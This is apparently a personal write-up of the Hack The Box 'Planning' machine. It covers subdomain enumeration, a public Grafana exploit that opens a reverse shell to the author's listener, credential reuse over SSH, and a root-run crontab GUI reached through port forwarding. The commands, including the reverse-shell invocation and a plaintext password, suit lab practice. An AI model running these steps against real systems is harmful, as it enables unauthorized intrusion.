---
title: Hack The Box - Planning (2025) Writeup
date: 2025-08-10 18:00:00
categories:
  - HackTheBox
  - Writeups
tags:
  - Planning
  - Grafana
  - Subdomain Enumeration
  - Crontab
  - Port Forwarding
  - Root
---

# Planning (Hack The Box) - 2025

> "Sometimes, hacking is just a series of dead ends—until you find the one path that works."

---

## 1. Recon: The Usual Start (and a Lot of Nothing)

I kicked things off with an Nmap scan, hoping for a quick win:

```bash
nmap -sV -A planning.htb
```

Output:
```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

I added `planning.htb` to `/etc/hosts` and checked the website. Nothing useful—no login, no juicy info, just a static page. I tried directory brute-forcing with Gobuster:

```bash
gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

All I got were some CSS, JS, and lib folders. No admin, no uploads, no fun.

---

## 2. Subdomain Enumeration: Finally, a Lead

Feeling stuck, I switched to subdomain brute-forcing with ffuf:

```bash
ffuf -w /snap/seclists/current/Discovery/DNS/subdomains-spanish.txt -H "Host:FUZZ.planning.htb" -u http://planning.htb -c -fs 178 -t 50
```

Finally, a hit: `grafana.planning.htb` (status 302). I added it to `/etc/hosts` and opened it in my browser.

---

## 3. Grafana: Exploit or Bust

I checked the Grafana version—old, but not ancient. I spent a good while trying different public exploits from GitHub. Most failed, some crashed, but eventually, I found one that worked. The syntax was picky, and I had to tweak the script a few times before it finally popped a shell.

```bash
python3 poc.py --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.167 --reverse-port 4444 --url http://grafana.planning.htb:80
```

Netcat on my end:
```bash
nc -lvnp 4444
```

Shell as the Grafana user! But... not much to see. No sudo, no interesting writable files.

---

## 4. Chasing Every Lead: Environment Variables, SSH, and More

I started digging through environment variables—sometimes you get lucky. I found a username and password for Grafana, but they didn't work for the web login. Out of curiosity, I tried SSH with them. To my surprise, I got a shell as a new user!

Still, no root. I checked for backups, nothing. SUID binaries, nothing new. I was starting to get frustrated.

---

## 5. Database and Crontab: The Next Break

I searched for database files:

```bash
find / -type f -name '*.db' 2>/dev/null
```

Found `crontab.db`. Inside, I saw some commands being executed, but the files referenced didn't exist. I spent a long time chasing this rabbit hole, but it felt like a dead end.

---

## 6. Desperation Pays Off: Port and Process Hunting

Running out of ideas, I listed all running processes and open ports:

```bash
ss -tuln
ps aux
```

To my surprise, I found a service listening on `127.0.0.1:8000`. I set up SSH port forwarding:

```bash
ssh user@planning.htb -L 8000:127.0.0.1:8000
```

Navigated to `localhost:8000` on my machine—boom, a root GUI interface for crontab management!

---

## 7. Root: The Final Push

The GUI allowed command execution. I used it to output `/root/root.txt` to `/tmp/flag.txt`:

```bash
cat /root/root.txt > /tmp/flag.txt
```

Switched back to my shell as the user, grabbed the flag from `/tmp/flag.txt`. Success at last!

---

## Reflections

- **Most of hacking is trying things that don't work—until something does.**
- **Subdomain enumeration is always worth the time.**
- **Never underestimate the power of process and port hunting.**

> "Every fail is a step closer to the win."

---

*This writeup is for educational purposes only. Always hack responsibly.* 